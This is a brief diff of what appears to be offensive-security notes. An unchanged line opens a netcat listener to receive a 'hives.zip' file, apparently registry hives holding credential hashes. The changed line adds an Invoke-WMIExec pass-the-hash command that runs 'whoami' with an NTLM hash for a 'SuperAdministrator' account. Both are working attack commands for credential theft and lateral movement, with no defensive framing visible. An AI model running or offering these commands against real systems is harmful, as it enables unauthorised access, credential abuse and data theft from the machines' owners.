@@ -82,5 +82,5 @@ nc -lvnp 80 > hives.zip
 
 ```
 ```
-Enable-NetFirewallRule -Name "FPS-ICMP4-ERQ-In"
+Invoke-WMIExec -Target 127.0.0.1 -Username SuperAdministrator -Hash aad3b435b51404eeaad3b435b51404ee:13b29964cc2480b4ef454c59562e675c -Command "whoami"
 ```
